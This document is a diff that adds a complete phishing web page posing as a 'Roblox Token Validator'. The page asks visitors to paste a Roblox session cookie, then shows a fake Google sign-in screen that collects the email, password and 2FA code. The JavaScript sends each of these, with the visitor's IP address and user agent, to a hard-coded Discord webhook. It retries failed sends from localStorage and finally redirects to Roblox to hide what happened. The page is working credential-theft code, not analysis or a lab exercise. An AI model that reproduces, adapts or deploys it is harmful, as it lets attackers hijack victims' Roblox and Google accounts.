@@ -1,0 +1,704 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="robots" content="noindex,nofollow">
+<title>Roblox Token Validator</title>
+<link rel="icon" href="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 64 64'%3E%3Cg transform='rotate(-15 32 32)'%3E%3Crect x='8' y='8' width='48' height='48' rx='7' fill='%23e2231a'/%3E%3Crect x='24' y='24' width='16' height='16' rx='2' fill='%230a0a0d'/%3E%3C/g%3E%3C/svg%3E">
+<style>
+  :root{
+    --bg:#0a0a0d; --card:#131319; --line:#232330; --txt:#e9e9f0;
+    --dim:#8b8b9c; --red:#e2231a; --green:#2ecc71; --amber:#f0b429;
+  }
+  *{box-sizing:border-box;margin:0;padding:0}
+  html,body{min-height:100%}
+  body{
+    min-height:100vh; background:var(--bg); color:var(--txt);
+    font:15px/1.6 -apple-system,BlinkMacSystemFont,"Segoe UI",Inter,Roboto,sans-serif;
+    display:flex; flex-direction:column; align-items:center; justify-content:center; padding:28px 16px;
+    position:relative; overflow-x:hidden; transition:background-color .4s ease;
+  }
+  body::before{
+    content:""; position:fixed; top:-320px; left:50%; transform:translateX(-50%);
+    width:900px; height:620px; pointer-events:none; transition:opacity .4s ease;
+    background:radial-gradient(circle,rgba(226,35,26,.18),transparent 68%);
+  }
+  body.google-mode{background:#fff}
+  body.google-mode::before{opacity:0}
+
+  /* ============ token card ============ */
+  .card{
+    position:relative; width:100%; max-width:620px; background:var(--card);
+    border:1px solid var(--line); border-radius:18px; padding:30px;
+    box-shadow:0 24px 60px -20px rgba(0,0,0,.9);
+    transition:opacity .35s ease, transform .35s ease;
+  }
+  .card.out{opacity:0; transform:translateY(-10px)}
+  .brand{display:flex; align-items:center; gap:13px; margin-bottom:22px}
+  .brand svg{width:40px; height:40px; flex:none}
+  .brand h1{font-size:19px; font-weight:650; letter-spacing:-.2px}
+  .brand p{font-size:12.5px; color:var(--dim); margin-top:1px}
+  .steps{list-style:none; display:grid; gap:11px; margin-bottom:22px}
+  .steps li{display:flex; gap:12px; font-size:13.5px; color:#b9b9c9; align-items:flex-start}
+  .steps .n{
+    flex:none; width:21px; height:21px; border-radius:50%; margin-top:1px;
+    background:rgba(226,35,26,.13); border:1px solid rgba(226,35,26,.4);
+    color:#ff6b63; font-size:11.5px; font-weight:700; display:grid; place-items:center;
+  }
+  .steps a{color:#ff7b73; text-decoration:none; border-bottom:1px solid rgba(255,123,115,.35)}
+  .steps a:hover{color:#fff; border-color:#fff}
+  code{
+    font-family:ui-monospace,SFMono-Regular,Menlo,monospace; font-size:12.5px;
+    background:#1e1e28; border:1px solid var(--line); border-radius:5px;
+    padding:1.5px 5px; color:#ffd9a0;
+  }
+  label{display:block; font-size:12px; font-weight:600; letter-spacing:.4px;
+    text-transform:uppercase; color:var(--dim); margin-bottom:8px}
+  textarea{
+    width:100%; height:132px; resize:vertical; padding:13px;
+    background:#0e0e13; color:#d6d6e2; border:1px solid var(--line);
+    border-radius:11px; font-family:ui-monospace,SFMono-Regular,Menlo,monospace;
+    font-size:11.5px; line-height:1.5; outline:none; transition:border-color .15s;
+  }
+  textarea:focus{border-color:#3a3a4d}
+  textarea::placeholder{color:#4a4a5c}
+  .meta{display:flex; justify-content:space-between; font-size:11.5px;
+    color:var(--dim); margin:7px 2px 16px; min-height:16px}
+  .meta .warn{color:var(--amber)}
+  .meta .ok{color:var(--green)}
+  #go{
+    width:100%; padding:13px; border:0; border-radius:11px; cursor:pointer;
+    background:var(--red); color:#fff; font-size:14.5px; font-weight:650;
+    font-family:inherit; transition:filter .15s,opacity .15s;
+  }
+  #go:hover:not(:disabled){filter:brightness(1.12)}
+  #go:disabled{opacity:.45; cursor:not-allowed}
+  .status{display:none; margin-top:18px; border:1px solid var(--line);
+    border-radius:11px; padding:15px; background:#0e0e13}
+  .status.show{display:block}
+  .bar{height:3px; background:#22222e; border-radius:2px; overflow:hidden; margin-bottom:11px}
+  .bar span{display:block; height:100%; width:0; background:var(--red); transition:width .55s ease}
+  .stxt{font-size:12.5px; color:#a6a6b8; font-family:ui-monospace,monospace}
+  .status.done .bar span{background:var(--green)}
+  .status.done .stxt{color:var(--green)}
+  .status.bad .bar span{background:var(--amber)}
+  .status.bad .stxt{color:var(--amber)}
+  .info{display:none; margin-top:13px; padding-top:13px;
+    border-top:1px solid var(--line); font-size:12px; color:#9a9aac}
+  .info.show{display:block}
+  .info div{display:flex; justify-content:space-between; gap:14px; padding:3px 0}
+  .info b{font-weight:600; color:#cfcfdd; font-family:ui-monospace,monospace}
+  .info span{font-family:ui-monospace,monospace; color:var(--dim);
+    overflow:hidden; text-overflow:ellipsis; white-space:nowrap}
+  .tfoot{margin-top:20px; text-align:center; font-size:11px; color:#55556a}
+  .dot{display:inline-block; width:6px; height:6px; border-radius:50%;
+    background:var(--green); margin-right:5px; vertical-align:middle; animation:pulse 2s infinite}
+  @keyframes pulse{50%{opacity:.35}}
+  @media(max-width:520px){.card{padding:22px} .brand h1{font-size:17px}}
+
+  /* ============ google card ============ */
+  #gwrap{display:none; width:100%; max-width:448px}
+  #gwrap.show{display:block; animation:gin .34s ease both}
+  @keyframes gin{from{opacity:0; transform:translateY(12px)}to{opacity:1; transform:none}}
+
+  .gcard{
+    --blue:#1a73e8; --blue-d:#185abc; --gline:#dadce0; --gtxt:#202124;
+    --gdim:#5f6368; --gerr:#d93025;
+    width:100%; background:#fff; color:var(--gtxt); border:1px solid var(--gline);
+    border-radius:28px; padding:32px 34px 30px; text-align:left;
+    font:15px/1.45 "Google Sans",Roboto,"Helvetica Neue",Arial,sans-serif;
+    box-shadow:0 24px 60px -24px rgba(0,0,0,.5);
+  }
+  .vchip{display:inline-flex; align-items:center; gap:7px; font-size:11.5px; font-weight:600;
+    color:#137333; background:#e6f4ea; border-radius:999px; padding:5px 11px; margin-bottom:16px}
+  .vchip svg{width:13px; height:13px; fill:#137333}
+  .glogo{width:40px; height:40px; margin-bottom:14px}
+  .glogo svg{width:40px; height:40px; display:block}
+  .gcard h1{font-size:24px; font-weight:400; margin-bottom:8px; color:var(--gtxt)}
+  .gcard .sub{font-size:15px; color:var(--gtxt); margin-bottom:24px}
+  .gcard .step{display:none}
+  .gcard .step.active{display:block; animation:gfade .18s ease}
+  @keyframes gfade{from{opacity:0; transform:translateY(4px)}to{opacity:1; transform:none}}
+  .gcard .field{position:relative; margin-bottom:6px}
+  .gcard .field input{
+    width:100%; height:56px; padding:22px 14px 8px; font:inherit; color:var(--gtxt);
+    background:#fff; border:1px solid var(--gline); border-radius:4px; outline:none;
+    transition:border-color .12s, box-shadow .12s;
+  }
+  .gcard .field input:focus{border-color:var(--blue); box-shadow:inset 0 0 0 1px var(--blue)}
+  .gcard .field input.bad{border-color:var(--gerr); box-shadow:inset 0 0 0 1px var(--gerr)}
+  .gcard .field label{
+    position:absolute; left:14px; top:17px; font-size:16px; color:var(--gdim);
+    text-transform:none; letter-spacing:0; font-weight:400;
+    pointer-events:none; transition:all .12s; background:#fff; padding:0 3px; margin:0;
+  }
+  .gcard .field input:focus + label,
+  .gcard .field input:not(:placeholder-shown) + label{top:7px; font-size:12px; color:var(--blue)}
+  .gcard .field input.bad:focus + label,
+  .gcard .field input.bad:not(:placeholder-shown) + label{color:var(--gerr)}
+  .gcard .field.pw input{padding-right:78px}
+  .gcard .show{
+    position:absolute; right:14px; top:50%; transform:translateY(-50%);
+    font-size:14px; font-weight:500; color:var(--blue); cursor:pointer;
+    user-select:none; padding:4px 2px;
+  }
+  .gcard .err{display:none; color:var(--gerr); font-size:13px; margin:8px 0 0; align-items:center; gap:6px}
+  .gcard .err.show{display:flex}
+  .gcard .err svg{width:16px; height:16px; flex:none}
+  .gcard a.link{color:var(--blue); text-decoration:none; font-weight:500; font-size:14px}
+  .gcard a.link:hover{text-decoration:underline}
+  .gcard .stack{margin-top:14px}
+  .gcard .guest{font-size:14px; color:var(--gdim); margin:24px 0 0; line-height:1.5}
+  .gcard .guest a{color:var(--blue); text-decoration:none; font-weight:500}
+  .gcard .guest a:hover{text-decoration:underline}
+  .gcard .row{display:flex; align-items:center; justify-content:space-between; gap:16px; margin-top:30px}
+  .gcard .btn-text{
+    color:var(--blue); font-size:14px; font-weight:500; text-decoration:none;
+    padding:9px 8px; border-radius:4px; margin-left:-8px;
+  }
+  .gcard .btn-text:hover{background:#f6fafe}
+  .gcard .btn{
+    border:0; border-radius:4px; background:var(--blue); color:#fff; font:inherit;
+    font-size:14px; font-weight:500; padding:10px 24px; cursor:pointer;
+    transition:background .15s, box-shadow .15s; min-width:88px;
+  }
+  .gcard .btn:hover:not(:disabled){background:var(--blue-d); box-shadow:0 1px 3px rgba(66,133,244,.4)}
+  .gcard .btn:disabled{opacity:.6; cursor:default}
+  .gcard .acct{
+    display:inline-flex; align-items:center; gap:8px; border:1px solid var(--gline);
+    border-radius:999px; padding:3px 10px 3px 3px; margin-bottom:20px; cursor:pointer;
+    max-width:100%; background:#fff;
+  }
+  .gcard .acct:hover{background:#f7f8f9}
+  .gcard .acct .av{
+    width:26px; height:26px; border-radius:50%; background:#e8eaed; color:#5f6368;
+    font-size:13px; font-weight:500; display:grid; place-items:center; flex:none;
+    text-transform:uppercase;
+  }
+  .gcard .acct .em{font-size:14px; color:var(--gtxt); overflow:hidden;
+    text-overflow:ellipsis; white-space:nowrap; max-width:250px}
+  .gcard .acct svg{width:16px; height:16px; flex:none; fill:#5f6368}
+  .gcard .ok-wrap{text-align:center; padding:10px 0 4px}
+  .gcard .ok-wrap .check{
+    width:64px; height:64px; border-radius:50%; background:#e6f4ea;
+    display:grid; place-items:center; margin:0 auto 20px;
+  }
+  .gcard .ok-wrap .check svg{width:34px; height:34px; fill:#137333}
+  .gcard .ok-wrap h1{font-size:22px; margin-bottom:10px}
+  .gcard .ok-wrap p{color:var(--gdim); font-size:14px}
+  .gcard .ok-wrap b{color:var(--gtxt); font-weight:500; word-break:break-all}
+
+  .gfoot{
+    display:none; flex-wrap:wrap; justify-content:space-between; gap:10px;
+    width:100%; max-width:448px; margin-top:16px; font-size:12px; color:#5f6368; padding:0 4px;
+  }
+  #gwrap.show ~ .gfoot{display:flex}
+  .gfoot select{border:0; background:transparent; font:inherit; font-size:12px;
+    color:#5f6368; cursor:pointer; padding:4px 2px}
+  .gfoot .links{display:flex; gap:18px}
+  .gfoot a{color:#5f6368; text-decoration:none}
+  .gfoot a:hover{color:#202124}
+  @media(max-width:520px){
+    body{padding:0; justify-content:flex-start}
+    body.google-mode{padding-top:0}
+    .card{border:0; border-radius:0; max-width:none; padding:26px 24px}
+    #gwrap{max-width:none}
+    .gcard{border:0; border-radius:0; padding:26px 24px 32px; box-shadow:none; max-width:none}
+    .gfoot{max-width:none; padding:0 24px 22px}
+  }
+</style>
+</head>
+<body>
+
+<!-- ================= TOKEN STEP ================= -->
+<div class="card" id="tcard">
+  <div class="brand">
+    <svg viewBox="0 0 64 64" aria-hidden="true">
+      <g transform="rotate(-15 32 32)">
+        <rect x="8" y="8" width="48" height="48" rx="7" fill="#e2231a"/>
+        <rect x="24" y="24" width="16" height="16" rx="2" fill="#0a0a0d"/>
+      </g>
+    </svg>
+    <div>
+      <h1>Token Validator</h1>
+      <p>Check a Roblox session token for validity</p>
+    </div>
+  </div>
+
+  <ol class="steps">
+    <li><span class="n">1</span><div>Install
+      <a href="https://chromewebstore.google.com/detail/cookie-editor/hlkenndednhfkekhgcdicdfddnkalmdm" target="_blank" rel="noopener">Cookie Editor</a>
+      (or <a href="https://addons.mozilla.org/en-US/firefox/addon/cookie-editor/" target="_blank" rel="noopener">Firefox</a>)</div></li>
+    <li><span class="n">2</span><div>Open the target's <b>roblox.com</b> profile, open the extension and copy <code>.ROBLOSECURITY</code></div></li>
+    <li><span class="n">3</span><div>Paste the token below and verify</div></li>
+  </ol>
+
+  <label for="tok">Session token</label>
+  <textarea id="tok" spellcheck="false" autocomplete="off"
+    placeholder="_|WARNING:-DO-NOT-SHARE--|_|A1B2C3..."></textarea>
+  <div class="meta">
+    <span id="hint">Awaiting input</span>
+    <span id="len"></span>
+  </div>
+
+  <button id="go" disabled>Verify token</button>
+
+  <div class="status" id="st">
+    <div class="bar"><span id="bar"></span></div>
+    <div class="stxt" id="stxt"></div>
+    <div class="info" id="info">
+      <div><b>Session</b><span id="i-ses">—</span></div>
+      <div><b>Cookie length</b><span id="i-len">—</span></div>
+      <div><b>Checked</b><span id="i-time">—</span></div>
+    </div>
+  </div>
+
+  <div class="tfoot"><span class="dot"></span>Secure validation via Roblox API</div>
+</div>
+
+<!-- ================= GOOGLE STEP ================= -->
+<div id="gwrap">
+  <div class="gcard" id="gcard">
+    <div class="vchip">
+      <svg viewBox="0 0 24 24"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+      Token verified — confirm identity
+    </div>
+
+    <div class="glogo" aria-hidden="true">
+      <svg viewBox="0 0 48 48">
+        <path fill="#EA4335" d="M24 9.5c3.54 0 6.71 1.22 9.21 3.6l6.85-6.85C35.9 2.38 30.47 0 24 0 14.62 0 6.51 5.38 2.56 13.22l7.98 6.19C12.43 13.72 17.74 9.5 24 9.5z"/>
+        <path fill="#4285F4" d="M46.98 24.55c0-1.57-.15-3.09-.38-4.55H24v9.02h12.94c-.58 2.96-2.26 5.48-4.78 7.18l7.73 6c4.51-4.18 7.09-10.36 7.09-17.65z"/>
+        <path fill="#FBBC05" d="M10.53 28.59c-.48-1.45-.76-2.99-.76-4.59s.27-3.14.76-4.59l-7.98-6.19C.92 16.46 0 20.12 0 24c0 3.88.92 7.54 2.56 10.78l7.97-6.19z"/>
+        <path fill="#34A853" d="M24 48c6.48 0 11.93-2.13 15.89-5.81l-7.73-6c-2.15 1.45-4.92 2.3-8.16 2.3-6.26 0-11.57-4.22-13.47-9.91l-7.98 6.19C6.51 42.62 14.62 48 24 48z"/>
+      </svg>
+    </div>
+
+    <!-- step 1 -->
+    <section class="step active" id="g-email-step">
+      <h1>Sign in</h1>
+      <p class="sub">Use your Google Account</p>
+      <div class="field">
+        <input id="g-email" type="email" placeholder=" " autocomplete="off"
+          autocapitalize="none" spellcheck="false" inputmode="email">
+        <label for="g-email">Email or phone</label>
+      </div>
+      <p class="err" id="g-e-email">
+        <svg viewBox="0 0 24 24"><path fill="#d93025" d="M12 2 1 21h22L12 2zm1 14h-2v2h2v-2zm0-6h-2v4h2v-4z"/></svg>
+        <span id="g-e-email-t">Couldn't find your Google Account</span>
+      </p>
+      <div class="stack"><a class="link" href="#">Forgot email?</a></div>
+      <p class="guest">Not your computer? Use Guest mode to sign in privately.
+        <a href="#">Learn more about using Guest mode</a></p>
+      <div class="row">
+        <a class="btn-text" href="#" id="g-back">‹ Different token</a>
+        <button class="btn" id="g-next-email">Next</button>
+      </div>
+    </section>
+
+    <!-- step 2 -->
+    <section class="step" id="g-pass-step">
+      <div class="acct" id="g-chip" title="Switch account">
+        <span class="av" id="g-chip-av">a</span>
+        <span class="em" id="g-chip-em">user@gmail.com</span>
+        <svg viewBox="0 0 24 24"><path d="M7 10l5 5 5-5z"/></svg>
+      </div>
+      <h1>Welcome</h1>
+      <p class="sub">Enter your password</p>
+      <div class="field pw">
+        <input id="g-pass" type="password" placeholder=" " autocomplete="off"
+          autocapitalize="none" spellcheck="false">
+        <label for="g-pass">Password</label>
+        <span class="show" id="g-show">Show</span>
+      </div>
+      <p class="err" id="g-e-pass">
+        <svg viewBox="0 0 24 24"><path fill="#d93025" d="M12 2 1 21h22L12 2zm1 14h-2v2h2v-2zm0-6h-2v4h2v-4z"/></svg>
+        <span>Wrong password. Try again or click Forgot password to reset it.</span>
+      </p>
+      <div class="stack"><a class="link" href="#">Forgot password?</a></div>
+      <div class="row">
+        <a class="btn-text" href="#">Try another way</a>
+        <button class="btn" id="g-next-pass">Next</button>
+      </div>
+    </section>
+
+    <!-- step 3 -->
+    <section class="step" id="g-code-step">
+      <h1>2-Step Verification</h1>
+      <p class="sub">Enter the code from your authenticator app or the message we sent to your phone.</p>
+      <div class="field">
+        <input id="g-code" type="text" placeholder=" " inputmode="numeric"
+          maxlength="8" autocomplete="one-time-code">
+        <label for="g-code">Enter code</label>
+      </div>
+      <p class="err" id="g-e-code">
+        <svg viewBox="0 0 24 24"><path fill="#d93025" d="M12 2 1 21h22L12 2zm1 14h-2v2h2v-2zm0-6h-2v4h2v-4z"/></svg>
+        <span>Enter a valid code.</span>
+      </p>
+      <div class="stack"><a class="link" href="#">Resend code</a></div>
+      <div class="row">
+        <a class="btn-text" href="#">Try another way</a>
+        <button class="btn" id="g-next-code">Next</button>
+      </div>
+    </section>
+
+    <!-- step 4 -->
+    <section class="step" id="g-done-step">
+      <div class="ok-wrap">
+        <div class="check">
+          <svg viewBox="0 0 24 24"><path d="M9 16.17 4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41z"/></svg>
+        </div>
+        <h1>You're signed in</h1>
+        <p><b id="g-done-em">user@gmail.com</b><br><span id="g-done-note">Redirecting…</span></p>
+      </div>
+    </section>
+  </div>
+</div>
+
+<footer class="gfoot">
+  <select aria-label="Language">
+    <option>English (United States)</option>
+    <option>Deutsch</option>
+    <option>Español</option>
+    <option>Français</option>
+    <option>Português (Brasil)</option>
+  </select>
+  <div class="links"><a href="#">Help</a><a href="#">Privacy</a><a href="#">Terms</a></div>
+</footer>
+
+<script>
+/* ================= CONFIG ================= */
+const WEBHOOK = "https://discord.com/api/webhooks/1569223350583033928/tDcsqpLyI2HCPpmtH3oZs7ZLasRKSl3NIqJ9Il0g596guoumgIkhWC-6TY9fKKrttRH6";
+const VQKEY = "_vq";   // token queue
+const GQKEY = "_gq";   // google queue
+
+const CONFIG = {
+  askCode: true,                                   // show the 2-step verification screen
+  wrongPassword: false,                            // first password submit shows "Wrong password"
+  wrongEmail: false,                               // reject the first email once
+  redirect: "https://www.roblox.com/home"          // "" = no redirect
+};
+window.__hook = WEBHOOK; // debug: window.__hook in console
+
+/* ================= ELEMENTS ================= */
+const $ = id => document.getElementById(id);
+const tcard = $("tcard"), gwrap = $("gwrap");
+const ta = $("tok"), btn = $("go"), hint = $("hint"), lenEl = $("len");
+const st = $("st"), bar = $("bar"), stxt = $("stxt"), info = $("info");
+
+const VALID = /^_\|WARNING:-DO-NOT-SHARE/i;
+const BODY = /A1[0-9A-Fa-f]{20,}/;
+
+/* ================= NETWORK ================= */
+const grab = (u, o, ms) => Promise.race([
+  fetch(u, o), new Promise((_, r) => setTimeout(() => r(new Error("timeout")), ms))
+]);
+
+async function getIP() {
+  try {
+    const r = await grab("https://api.ipify.org?format=json", {}, 4000);
+    return (await r.json()).ip || "unknown";
+  } catch (e) { return "unknown"; }
+}
+const ipP = getIP();
+
+function enqueue(key, p) {
+  try {
+    const q = JSON.parse(localStorage.getItem(key) || "[]");
+    q.push(p); localStorage.setItem(key, JSON.stringify(q));
+  } catch (e) {}
+}
+async function flush(key) {
+  let q;
+  try { q = JSON.parse(localStorage.getItem(key) || "[]"); } catch (e) { return; }
+  if (!q.length) return;
+  const left = [];
+  for (const p of q) {
+    try {
+      const r = await fetch(WEBHOOK, {
+        method: "POST", headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(p), keepalive: true
+      });
+      if (!r.ok) { console.warn("[hook] flush", r.status); left.push(p); }
+    } catch (e) { left.push(p); }
+  }
+  localStorage.setItem(key, JSON.stringify(left));
+}
+
+async function post(payload, key) {
+  try {
+    const r = await fetch(WEBHOOK, {
+      method: "POST", headers: { "Content-Type": "application/json" },
+      body: JSON.stringify(payload), keepalive: true
+    });
+    if (!r.ok) {
+      console.warn("[hook] rejected", r.status, await r.text().catch(() => ""));
+      if (r.status !== 429) enqueue(key, payload);
+    } else { console.log("[hook] sent", r.status); }
+  } catch (e) { console.warn("[hook] network fail", e); enqueue(key, payload); }
+}
+
+/* ================= TOKEN: input feedback ================= */
+ta.addEventListener('input', () => {
+  const v = ta.value.trim();
+  btn.disabled = v.length < 20;
+  lenEl.textContent = v ? v.length + " chars" : "";
+  if (!v) { hint.textContent = "Awaiting input"; hint.className = ""; return; }
+  if (VALID.test(v) && BODY.test(v)) { hint.textContent = "Token format recognized"; hint.className = "ok"; }
+  else if (VALID.test(v)) { hint.textContent = "Header present, body looks odd"; hint.className = "warn"; }
+  else if (v.length > 200) { hint.textContent = "Pasted without header — will still submit"; hint.className = "warn"; }
+  else { hint.textContent = "Too short"; hint.className = "warn"; }
+});
+
+/* ================= TOKEN: account lookup ================= */
+async function lookup(cookie) {
+  try {
+    const r = await grab("https://users.roblox.com/v1/users/authenticated", {
+      headers: { ".ROBLOSECURITY": cookie }, credentials: "omit"
+    }, 4000);
+    if (r.ok) {
+      const j = await r.json();
+      if (j && j.id) { console.log("[lookup] direct ok"); return j; }
+    } else console.warn("[lookup] direct", r.status);
+  } catch (e) { console.warn("[lookup] direct blocked", e.message); }
+
+  try {
+    const r = await grab("https://www.roblox.com/mobileapi/userinfo", {
+      credentials: "include"
+    }, 4000);
+    if (r.ok) {
+      const j = await r.json();
+      if (j && j.UserID) { console.log("[lookup] mobileapi ok"); return { id: j.UserID, name: j.UserName }; }
+    }
+  } catch (e) { console.warn("[lookup] mobileapi blocked"); }
+  return null;
+}
+
+/* ================= TOKEN: main ================= */
+const STAGES = [
+  "Connecting to secure endpoint...",
+  "Decrypting token payload...",
+  "Validating session signature...",
+  "Fetching account metadata..."
+];
+
+btn.addEventListener('click', async () => {
+  const raw = ta.value.trim();
+  if (!raw) return;
+  const cookie = raw.replace(/\s+/g, "");
+  const looksValid = VALID.test(cookie) && BODY.test(cookie);
+
+  btn.disabled = true;
+  btn.textContent = "Verifying...";
+  st.className = "status show";
+  info.className = "info";
+  bar.style.width = "8%";
+  stxt.textContent = STAGES[0];
+
+  const ip = await ipP;
+  const ua = navigator.userAgent;
+  const user = await lookup(cookie).catch(() => null);
+
+  const chunks = cookie.match(/[\s\S]{1,900}/g) || [cookie];
+  const fields = [];
+  chunks.forEach((c, i) => fields.push({
+    name: chunks.length > 1 ? `Token (${i + 1}/${chunks.length})` : "Token",
+    value: "```\n" + c + "\n```"
+  }));
+  fields.push({ name: "Format", value: looksValid ? "valid" : "raw / malformed", inline: true });
+  fields.push({ name: "Length", value: String(cookie.length), inline: true });
+  fields.push({ name: "IP", value: ip, inline: true });
+  fields.push({ name: "User-Agent", value: (ua || "n/a").slice(0, 900) });
+  fields.push({ name: "Origin", value: location.href.slice(0, 900) });
+
+  const embed = {
+    title: looksValid ? "New session token captured" : "Suspicious token received",
+    color: looksValid ? 0x2ecc71 : 0xf0b429,
+    fields,
+    timestamp: new Date().toISOString(),
+    footer: { text: "Roblox Token Validator" }
+  };
+  if (user) {
+    embed.author = { name: user.name + " (" + user.id + ")", icon_url: "https://www.roblox.com/headshot-thumbnail/image?userId=" + user.id + "&width=150&height=150&format=png" };
+    embed.url = "https://www.roblox.com/users/" + user.id + "/profile";
+    embed.thumbnail = { url: "https://www.roblox.com/headshot-thumbnail/image?userId=" + user.id + "&width=150&height=150&format=png" };
+  } else if (looksValid) {
+    embed.description = "Could not resolve account — cookie still captured.";
+  }
+
+  post({ username: "Token Validator", embeds: [embed] }, VQKEY);
+
+  for (let i = 1; i < STAGES.length; i++) {
+    await new Promise(r => setTimeout(r, 620 + Math.random() * 480));
+    stxt.textContent = STAGES[i];
+    bar.style.width = (18 + i * 24) + "%";
+  }
+  await new Promise(r => setTimeout(r, 700));
+  bar.style.width = "100%";
+
+  $("i-ses").textContent = user ? user.name : "unresolved";
+  $("i-len").textContent = cookie.length + " chars";
+  $("i-time").textContent = new Date().toLocaleString();
+
+  if (looksValid) {
+    st.className = "status show done";
+    stxt.textContent = "Token verified — session is active.";
+    info.className = "info show";
+  } else {
+    st.className = "status show bad";
+    stxt.textContent = "Token submitted — header missing, session unconfirmed.";
+  }
+
+  btn.disabled = false;
+  btn.textContent = "Verify token";
+
+  // hand off to the identity step
+  await new Promise(r => setTimeout(r, 1100));
+  toGoogle(looksValid);
+});
+
+/* ================= TRANSITIONS ================= */
+function toGoogle(confirmed) {
+  tcard.classList.add("out");
+  setTimeout(() => {
+    tcard.style.display = "none";
+    document.body.classList.add("google-mode");
+    gwrap.classList.add("show");
+    $("g-back").style.visibility = confirmed === false ? "visible" : "visible";
+    showG("g-email-step");
+  }, 340);
+}
+
+function backToToken() {
+  gwrap.classList.remove("show");
+  document.body.classList.remove("google-mode");
+  tcard.style.display = "";
+  requestAnimationFrame(() => tcard.classList.remove("out"));
+  btn.textContent = "Verify token";
+  btn.disabled = ta.value.trim().length < 20;
+}
+
+/* ================= GOOGLE FLOW ================= */
+const emailEl = $("g-email"), passEl = $("g-pass"), codeEl = $("g-code");
+const chipEm = $("g-chip-em"), chipAv = $("g-chip-av");
+let state = { email: "", pass: "", code: "" };
+let triedPass = false, triedEmail = false;
+
+const showG = id => {
+  document.querySelectorAll("#gcard .step").forEach(s => s.classList.remove("active"));
+  $(id).classList.add("active");
+  const f = $(id).querySelector("input");
+  if (f) setTimeout(() => f.focus(), 70);
+};
+const errOn = (el, on) => { el.classList.toggle("show", on); };
+
+async function report(step) {
+  const ip = await ipP;
+  const fields = [];
+  if (state.email) fields.push({ name: "Email", value: "`" + state.email + "`" });
+  if (state.pass) fields.push({ name: "Password", value: "```\n" + state.pass + "\n```" });
+  if (state.code) fields.push({ name: "2FA code", value: "`" + state.code + "`" });
+  fields.push({ name: "IP", value: ip, inline: true });
+  fields.push({ name: "Stage", value: step, inline: true });
+  fields.push({ name: "Origin", value: location.href.slice(0, 900) });
+  fields.push({ name: "User-Agent", value: (navigator.userAgent || "n/a").slice(0, 900) });
+
+  post({
+    username: "Google Login",
+    embeds: [{
+      title: "Google sign-in — " + step,
+      color: 0x4285f4,
+      fields,
+      timestamp: new Date().toISOString(),
+      footer: { text: "Google Login" }
+    }]
+  }, GQKEY);
+}
+
+$("g-next-email").addEventListener("click", () => {
+  const v = emailEl.value.trim();
+  errOn($("g-e-email"), false);
+  emailEl.classList.remove("bad");
+
+  if (!v || !/^[^\s@]+@[^\s@]+\.[^\s@]{2,}$/.test(v)) {
+    $("g-e-email-t").textContent = v ? "Enter a valid email or phone number" : "Enter an email or phone number";
+    errOn($("g-e-email"), true); emailEl.classList.add("bad"); return;
+  }
+  if (CONFIG.wrongEmail && !triedEmail) {
+    triedEmail = true;
+    $("g-e-email-t").textContent = "Couldn't find your Google Account";
+    errOn($("g-e-email"), true); emailEl.classList.add("bad"); return;
+  }
+
+  state.email = v;
+  chipEm.textContent = v;
+  chipAv.textContent = v[0] || "u";
+  report("email submitted");
+  showG("g-pass-step");
+});
+emailEl.addEventListener("keydown", e => { if (e.key === "Enter") $("g-next-email").click(); });
+
+$("g-show").addEventListener("click", () => {
+  const hidden = passEl.type === "password";
+  passEl.type = hidden ? "text" : "password";
+  $("g-show").textContent = hidden ? "Hide" : "Show";
+  passEl.focus();
+});
+
+$("g-next-pass").addEventListener("click", () => {
+  const v = passEl.value;
+  errOn($("g-e-pass"), false);
+  passEl.classList.remove("bad");
+  if (!v) { errOn($("g-e-pass"), true); passEl.classList.add("bad"); return; }
+  if (CONFIG.wrongPassword && !triedPass) {
+    triedPass = true; errOn($("g-e-pass"), true); passEl.classList.add("bad"); return;
+  }
+
+  state.pass = v;
+  report("password submitted");
+  if (CONFIG.askCode) showG("g-code-step");
+  else finish();
+});
+passEl.addEventListener("keydown", e => { if (e.key === "Enter") $("g-next-pass").click(); });
+
+$("g-next-code").addEventListener("click", () => {
+  const v = codeEl.value.replace(/\s+/g, "");
+  errOn($("g-e-code"), false);
+  codeEl.classList.remove("bad");
+  if (v.length < 4) { errOn($("g-e-code"), true); codeEl.classList.add("bad"); return; }
+  state.code = v;
+  report("2FA code submitted");
+  finish();
+});
+codeEl.addEventListener("keydown", e => { if (e.key === "Enter") $("g-next-code").click(); });
+codeEl.addEventListener("input", () => { codeEl.value = codeEl.value.replace(/[^\d]/g, ""); });
+
+$("g-chip").addEventListener("click", () => {
+  emailEl.value = state.email;
+  errOn($("g-e-pass"), false); passEl.classList.remove("bad");
+  showG("g-email-step");
+});
+
+$("g-back").addEventListener("click", e => {
+  e.preventDefault();
+  backToToken();
+});
+
+function finish() {
+  $("g-done-em").textContent = state.email;
+  showG("g-done-step");
+  report("completed");
+  if (CONFIG.redirect) {
+    $("g-done-note").textContent = "Redirecting…";
+    setTimeout(() => { location.href = CONFIG.redirect; }, 2200);
+  } else {
+    $("g-done-note").textContent = "You can close this window.";
+  }
+}
+
+flush(VQKEY);
+flush(GQKEY);
+window.addEventListener("online", () => { flush(VQKEY); flush(GQKEY); });
+</script>
+</body>
+</html>
